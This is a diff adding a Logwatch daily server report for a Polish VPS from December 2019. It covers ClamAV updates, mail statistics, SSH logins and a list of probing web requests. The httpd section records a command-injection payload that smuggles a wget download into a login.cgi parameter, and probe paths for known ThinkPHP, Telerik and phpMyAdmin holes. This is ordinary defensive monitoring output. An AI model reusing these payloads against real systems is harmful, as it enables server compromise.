@@ -1,0 +1,152 @@
+Return-Path: <root@hrankiety.pl>
+Delivered-To: postmaster@hrankiety.pl
+Received: by hrankiety.pl (Postfix, from userid 0)
+	id 26F399F2166E; Fri, 27 Dec 2019 03:35:09 +0100 (CET)
+To: postmaster@hrankiety.pl
+From: postmaster@hrankiety.pl
+Subject: Logwatch for 2626.serwervps.pl (Linux)
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset="iso-8859-1"
+Message-Id: <20191227023509.26F399F2166E@hrankiety.pl>
+Date: Fri, 27 Dec 2019 03:35:05 +0100 (CET)
+
+
+ ################### Logwatch 7.3.6 (05/19/07) #################### 
+        Processing Initiated: Fri Dec 27 03:35:05 2019
+        Date Range Processed: yesterday
+                              ( 2019-Dec-26 )
+                              Period is day.
+      Detail Level of Output: 0
+              Type of Output: unformatted
+           Logfiles for Host: 2626.serwervps.pl
+  ################################################################## 
+ 
+ --------------------- clam-update Begin ------------------------ 
+
+ Last ClamAV update process started at Thu Dec 26 03:51:09 2019
+ 
+ Last Status:
+    WARNING: Your ClamAV installation is OUTDATED!
+    WARNING: Local version: 0.100.3 Recommended version: 0.102.1
+    DON'T PANIC! Read https://www.clamav.net/documents/upgrading-clamav
+    main.cld is up to date (version: 59, sigs: 4564902, f-level: 60, builder: sigmgr)
+    Downloading daily-25674.cdiff [100%]
+    daily.cld updated (version: 25674, sigs: 2077647, f-level: 63, builder: raynman)
+    Can't query daily.25674.93.1.0.6810DB54.ping.clamav.net
+    bytecode.cld is up to date (version: 331, sigs: 94, f-level: 63, builder: anvilleg)
+    Database updated (6642643 signatures) from db.local.clamav.net (IP: 104.16.219.84)
+ 
+ ---------------------- clam-update End ------------------------- 
+
+ 
+ --------------------- httpd Begin ------------------------ 
+
+ 
+ A total of 1 sites probed the server 
+    78.31.71.113
+ 
+ Requests with error response codes
+    400 Bad Request
+       /login.cgi?cli=aa%20aa%27;wget%20http://18 ... h%20/tmp/kh%27$: 2 Time(s)
+       null: 1 Time(s)
+    404 Not Found
+       /.env: 1 Time(s)
+       //cgi-bin/test-cgi: 1 Time(s)
+       //cgi-bin/test.cgi: 1 Time(s)
+       //cgi-sys/realsignup.cgi: 1 Time(s)
+       /HNAP1/: 1 Time(s)
+       /TP/html/public/index.php: 1 Time(s)
+       /TP/index.php: 1 Time(s)
+       /TP/public/index.php: 1 Time(s)
+       /Telerik.Web.UI.WebResource.axd?type=rau: 2 Time(s)
+       /admin/includes/general.js: 1 Time(s)
+       /admin/view/javascript/common.js: 1 Time(s)
+       /administrator/: 1 Time(s)
+       /administrator/help/en-GB/toc.json: 1 Time(s)
+       /administrator/language/en-GB/install.xml: 1 Time(s)
+       /backup/wp-login.php: 1 Time(s)
+       /cms/wp-login.php: 1 Time(s)
+       /editBlackAndWhiteList: 1 Time(s)
+       /elrekt.php: 1 Time(s)
+       /fckeditor/editor/filemanager/connectors/p ... .php?Type=Media: 1 Time(s)
+       /html/public/index.php: 1 Time(s)
+       /images/editor/separator.gif: 1 Time(s)
+       /index.php: 1 Time(s)
+       /index.php?s=/Index/\\think\\app/invokefun ... ]=HelloThinkPHP: 1 Time(s)
+       /js/header-rollup-554.js: 1 Time(s)
+       /license.php: 1 Time(s)
+       /misc/ajax.js: 1 Time(s)
+       /myadmin/scripts/install.php: 1 Time(s)
+       /phpmyadmin/: 1 Time(s)
+       /phpmyadmin/scripts/install.php: 1 Time(s)
+       /plugins/system/debug/debug.xml: 1 Time(s)
+       /pma/scripts/install.php: 1 Time(s)
+       /public/index.php: 1 Time(s)
+       /sitemap.xml: 2 Time(s)
+       /thinkphp/html/public/index.php: 1 Time(s)
+       /vendor/phpunit/phpunit/build.xml: 1 Time(s)
+       /w00tw00t.at.blackhats.romanian.anti-sec:): 1 Time(s)
+       /website/wp-login.php: 1 Time(s)
+       /wp-includes/js/jquery/jquery.js: 1 Time(s)
+       /wp-login.php: 3 Time(s)
+       http://www.msftncsi.com/ncsi.txt: 1 Time(s)
+ 
+ ---------------------- httpd End ------------------------- 
+
+ 
+ --------------------- Postfix Begin ------------------------ 
+
+      777   *Warning: Pre-queue content-filter connection overload 
+     7442   SASL authentication failed 
+       55   Miscellaneous warnings 
+ 
+  630.704K  Bytes accepted                           645,841
+  624.654K  Bytes delivered                          639,646
+ ========   ================================================
+ 
+       30   Accepted                                 100.00%
+ --------   ------------------------------------------------
+       30   Total                                    100.00%
+ ========   ================================================
+ 
+     7436   Connections made      
+        2   Connections lost      
+     7437   Disconnections        
+       30   Removed from queue    
+       28   Delivered             
+        2   Bounce (remote)       
+        1   DSNs undeliverable    
+ 
+ 
+ 
+ ---------------------- Postfix End ------------------------- 
+
+ 
+ --------------------- SSHD Begin ------------------------ 
+
+ 
+ Users logging in through sshd:
+    btertil:
+       185.17.41.230 (backup): 2 times
+ 
+ 
+ Received disconnect:
+    11: disconnected by user : 2 Time(s)
+ 
+ ---------------------- SSHD End ------------------------- 
+
+ 
+ --------------------- Disk Space Begin ------------------------ 
+
+ Filesystem      Size  Used Avail Use% Mounted on
+ /dev/simfs       50G   23G   28G  45% /
+ none            1.0G  4.0K  1.0G   1% /dev
+ 
+ 
+ ---------------------- Disk Space End ------------------------- 
+
+ 
+ ###################### Logwatch End ######################### 
+
+ 
